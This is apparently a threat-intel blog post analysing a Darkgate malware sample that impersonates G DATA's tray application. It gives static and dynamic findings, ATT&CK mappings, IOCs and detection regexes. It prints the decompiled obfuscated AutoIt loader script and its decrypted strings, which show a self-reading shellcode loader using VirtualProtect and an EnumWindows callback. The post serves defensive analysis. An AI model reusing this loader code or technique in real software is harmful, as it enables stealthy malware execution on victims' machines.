![Darkgate](/public/images/darkgate-3-return-of-the-temp/darkgate-three.png)
# Darkgate 3: Return of the Temp
## My third analysis of the popular commodity malware loader

New ye-... new day, new online community. 

I recently joined the Incident Response Chaos Club as a contributor. I used to be a cyber incident responder and cyber threat intel analyst, so this type and level of collaboration brings me back to my "good ole" days. 

With that in mind, I'm going to keep focus on the "what's old is new" theme by analyzing a familiar face, Darkgate. 

## High-Level Overview

1. `AVKTray.exe` (Darkgate) will write `Autoit3.exe` and `script.a3x` files to `C:\temp\test`.
2. `AVKTray.exe` will write an additional directory to disk at `C:\ProgramData\adcdffd`.
3. `script.a3x`via `Autoit3.exe` will create a log file in `C:\ProgramData\adcdffd\ekeehbb`.
2. `script.a3x` via `Autoit3.exe` will invoke `cmd.exe` to load the script.
5. `cmd.exe` will enumerate system domain information and save it to a file within `~\AppData\Roaming`.

## Static Analysis

### Basic Characteristics

- Operation system: Windows(XP)[I386, 32-bit, GUI]
- Linker: Microsoft Linker(14.16.27026)
- Compiler: Microsoft Visual C/C++(19.16.27026)[C++]
- Language: C++
- Tool: Visual Studio(2017, v15.9)
- Sign tool: Windows Authenticode(2.0)[PKCS #7]
- (Heur)Packer: Compressed or packed data[Section 0 (".text") compressed]
- Debug data: Binary[Offset=0x001fbca0,Size=0x72]
  - Debug data: PDB file link(7.0)
- Overlay: Binary[Offset=0x00296200,Size=0x4737]
  - Certificate: WinAuth(2.0)[PKCS #7]

### Dissassembly

With the multiple references to `G DATA`, `AVKTray`, and `G DATA Security Software - Tray Application`, this appears to be impersonating legitimate security software:

![OriginalFilename](/public/images/darkgate-3-return-of-the-temp/originalfilename.png)

Additionally, I see a familiar file extension, `a3x`:

![a3x](/public/images/darkgate-3-return-of-the-temp/diss-a3x.png)

With any sample of Darkgate, I expect to see multiple files and directories written to disk, so I pay particular attention to the `WriteFile` Windows API. Unfortunately, I wasn't able to glean much from the code references. 

## Dynamic Analysis

Upon execution, Darkgate will attempt to connect to the domain `todayput[.]shop`:

![DNSrequest](/public/images/darkgate-3-return-of-the-temp/dnsrequest.png)

There is also a new directory created at `c:\temp\test` that confirms the `a3x` string seen in disassembly, in addition to the AutoIt3 executable:

![a3x](/public/images/darkgate-3-return-of-the-temp/autoitexe.png)

In the process tree, this `Autoit3.exe` file will load the script.a3x with the command:
``` "c:\temp\test\Autoit3.exe" c:\temp\test\script.a3x ```

Additionally, attempting to execute this script manually will not work, judging by the (on the nose) dialogue box:

![Failed Execution](/public/images/darkgate-3-return-of-the-temp/failedautoitexecution.png)

I use myAut2Exe to analyze the `script.a3x` file:

![scripta3x](/public/images/darkgate-3-return-of-the-temp/scripta3x.png)

```
GUICreate("cfrygtvwk", 815, 365)
Func STRUCTT($TBYTE, $VVALUE)
	Return DllStructSetData($TBYTE, 1, $VVALUE)
EndFunc
Func _ENCRYPT($VVALUE, $SKEY)
	GUICreate("mttmzjfbk", 772, 249)
	$TBYTE = DllStructCreate("BYTE")
	GUICreate("znsrmgkpx", 888, 876)
	Local $S_ENCRYPTED
	GUICreate("nvqfrasel", 618, 839)
	Local $IKEYALT = BinaryLen($SKEY)
	GUICreate("wquyswcls", 369, 390)
	For $I = 1 To $IKEYALT
		$IKEYALT = BitXOR(BinaryMid($SKEY, $I, 1), $IKEYALT)
	Next
	GUICreate("hkqxizmpr", 874, 378)
	For $I = 1 To BinaryLen($VVALUE)
		$S_ENCRYPTED &= Chr(STRUCTT($TBYTE, BitNOT(BitXOR(BinaryMid($VVALUE, $I, 1), $IKEYALT))))
	Next
	GUICreate("pimajpopk", 802, 197)
	Return $S_ENCRYPTED
EndFunc
#NoTrayIcon
Local $DATA
$DATA = Execute(_ENCRYPT(BinaryToString("0xB5AF848998939A9EC2AC83868FB88F8B8EC2AC83868FA59A8F84C2AAB98998839A9EAC9F8686BA8B9E82C6CADBDCC3C6DDD3DADFDAC3C6C8B29BAEA39ABDADB3C8C3"), "XqDIpWGY"))
$PT = Execute(_ENCRYPT(BinaryToString("0xAE8686B99E989F899EA9988F8B9E8FC2C888939E8FB1DDD3DADFDAB7C8C3"), "XqDIpWGY"))
Execute(_ENCRYPT(BinaryToString("0xAE8686A98B8686C2C8818F98848F86D9D8C48E8686C8C6C8A8A5A5A6C8C6C8BC83989E9F8B86BA98859E8F899EC8C6C89A9E98C8C6AE8686B99E989F899EAD8F9EBA9E98C2CE9A9EC3C6C883849EC8C6DDD3DADFDACAC6C88E9D85988EC8C6DA92DEDAC6C88E9D85988EC0C8C6849F8686C3"), "XqDIpWGY"))
Execute(_ENCRYPT(BinaryToString("0xAE8686B99E989F899EB98F9EAE8B9E8BC2CE9A9EC6DBC6CE8E8B9E8BC3"), "XqDIpWGY"))
Execute(_ENCRYPT(BinaryToString("0xAE8686A98B8686C2C89F998F98D9D8C48E8686C8C6C883849EC8C6C8AF849F87BD83848E859D99C8C6C89A9E98C8C6AE8686B99E989F899EAD8F9EBA9E98C2CE9A9EC3C6C8869A8B988B87C8C6DAC3"), "XqDIpWGY"))
; DeTokenise by myAut2Exe >The Open Source AutoIT/AutoHotKey script decompiler< 2.16 build(215)
```

This script: 
- Decrypts embedded binary blobs using a custom XOR + NOT cipher. It then executes the strings via `Execute()`.
  - Starts with the lenth of the key then iteratively XORs each byte.
  - Each byte of $VALUE is XORed with the supplied key. 
  - After XORed with the key, each byte of $VALUE is bitwise NOTed. 
- It also creates GUI windows with random titles and dimensions, presumably for anti-analysis.

Just because, I wrote a simple script to decrypt XOR + NOT ciphers and saves the output to a JSON: [AutoDeGOder](https://github.com/grepstrength/autodegoder)

Using this script, the decrypted strings are: 

![Decrypted](/public/images/darkgate-3-return-of-the-temp/decryptedblobs.png)
```
[
  {
    "label": "blob_1",
    "hex_input": "B5AF848998939A9EC2AC83868FB88F8B8EC2AC83868FA59A8F84C2AAB98998839A9EAC9F8686BA8B9E82C6CADBDCC3C6DDD3DADFDAC3C6C8B29BAEA39ABDADB3C8C3",
    "decoded": "_Encrypt(FileRead(FileOpen(@ScriptFullPath, 16),79050),\"XqDIpWGY\")"
  },
  {
    "label": "blob_2",
    "hex_input": "AE8686B99E989F899EA9988F8B9E8FC2C888939E8FB1DDD3DADFDAB7C8C3",
    "decoded": "DllStructCreate(\"byte[79050]\")"
  },
  {
    "label": "blob_3",
    "hex_input": "AE8686A98B8686C2C8818F98848F86D9D8C48E8686C8C6C8A8A5A5A6C8C6C8BC83989E9F8B86BA98859E8F899EC8C6C89A9E98C8C6AE8686B99E989F899EAD8F9EBA9E98C2CE9A9EC3C6C883849EC8C6DDD3DADFDACAC6C88E9D85988EC8C6DA92DEDAC6C88E9D85988EC0C8C6849F8686C3",
    "decoded": "DllCall(\"kernel32.dll\",\"BOOL\",\"VirtualProtect\",\"ptr\",DllStructGetPtr($pt),\"int\",79050 ,\"dword\",0x40,\"dword*\",null)"
  },
  {
    "label": "blob_4",
    "hex_input": "AE8686B99E989F899EB98F9EAE8B9E8BC2CE9A9EC6DBC6CE8E8B9E8BC3",
    "decoded": "DllStructSetData($pt,1,$data)"
  },
  {
    "label": "blob_5",
    "hex_input": "AE8686A98B8686C2C89F998F98D9D8C48E8686C8C6C883849EC8C6C8AF849F87BD83848E859D99C8C6C89A9E98C8C6AE8686B99E989F899EAD8F9EBA9E98C2CE9A9EC3C6C8869A8B988B87C8C6DAC3",
    "decoded": "DllCall(\"user32.dll\",\"int\",\"EnumWindows\",\"ptr\",DllStructGetPtr($pt),\"lparam\",0)"
  }
]
```

Additionally, this script will also stage the directory `C:\ProgramData\adcdffd\affbdbb`. It will be running `cmd.exe` to run the command:
``` "c:\windows\system32\cmd.exe" /c wmic ComputerSystem get domain > C:\ProgramData\adcdffd\affbdbb ```

I go to this directory and get the hashes of the files. Again, `Autoit3.exe` is just a legitimate script interpreter software file that is heavily abused by Darkgate. Also, the `ebccdca.a3x` is a copy of `script.a3x` based on both the hash and the script contents.

Also notable is that `script.a3x` will enumerate the system for installed security software, ironically also including G DATA:

![Enumeration](/public/images/darkgate-3-return-of-the-temp/enum-security.png)

## Tactics, Techniques, and Procedures (TTPs)
### Execution
**T1059.003 - Command and Scripting Interpreter: Windows Command Shell**:

`script.a3x` will invoke `cmd.exe` to enumerate domain information. 

**T1059.010 - Command and Scripting Interpreter: AutoHotKey & AutoIT**:

`AVKTray.exe` will execute `script.a3x` via `Autoit3.exe`, an AutoIt intepreter. 

### Discovery
**T1057 - Process Discovery & T1518.001 - Software Discovery: Security Software Discovery**:

`script.a3x` will enumerate for common security software:
- McAfee
- Bitefender
- Elastic
- SentinelOne
- AVAST
- AVG
- Kaspersky
- Avira
- ESET
- Mawlarebytes
- Emsisoft
- Sophos
- G DATA
- Quick Heal
- F-Secure

**T1082 - System Information Discovery**:
`script.a3x` will invoke `cmd.exe` using `Autoit3.exe` to enumerate: 
```"c:\windows\system32\cmd.exe" /c wmic ComputerSystem get domain > C:\ProgramData\adcdffd\affbdbb```

### Defense Evasion
**T1564.001 - Hide Artifacts: Hidden Files and Directories**:

`script.a3x` will save multiple files to disk in the hidden folder `~\ProgramData`. There will be two child directories, `~\adcdffd\affbdbb`.

There will be an extensionless file named using the following Regx pattern `[a-zA-Z]{7}` within `C:\Users\<USERNAME>\AppData\Roaming`.

**T1027 - Obfuscated Files or Information**:

Darkgate will obfuscate itself by impersonating G DATA software by naming itself as `AKVTray.exe` and is digitally signed with a G DATA certificate.

### Collection
**T1074.001 - Data Staged: Local Data Staging**:

`script.a3x`, using Autoit3.exe, will store domain enumeration data into `C:\ProgramData\adcdffd\affbdbb`.

## Indicators of Compromise (IOCs)

AVKTray.exe (Darkgate) SHA-256:
```c43c3db16dcfabf532f0949c42cf39f1324ce9edbd3f34d65d38a0cf98491157```

Autoit3.exe SHA-256:
```237d1bca6e056df5bb16a1216a434634109478f882d3b1d58344c801d184f95d```

script.a3x SHA-256:
```98d2e34e1fb92e8180621e0d0cfd6c8e4730cb85ba8f29b4153a85fcb036b4a3```

ebccdca.a3x SHA-256:
```98d2e34e1fb92e8180621e0d0cfd6c8e4730cb85ba8f29b4153a85fcb036b4a3```

baKGGKH SHA-256:
```13638d70787ef3e1800adc536f780cf23686578ac4fae6607b6ef37013322d75```

Domain:
```todayput[.]shop```


## Detection Opportunities

Across multiple samples of Darkgate analyzed by myself, the malware will create staging directories using their own hashing system:
- 7-characters
- lowercase 
- alpha

```~\\ProgramData\\[a-z]{7}\\[a-zA-Z]{7}```

Or:

```~\\AppData\\Local\\Temp\\[a-zA-Z]{7}```

## Sample & References

- Sample: [Recorded Future's Triage](https://tria.ge/250907-gtsz3aej7w)

- Regex Generator: https://regex-generator.olafneumann.org/?sampleText=&flags=i

`fmt.Println(“Thanks for reading! If you enjoyed this article, please buy me a coffee!”, https://buymeacoffee.com/grepstrength)`
![Coffee](/public/images/darkgate-3-return-of-the-temp/coffee.gif)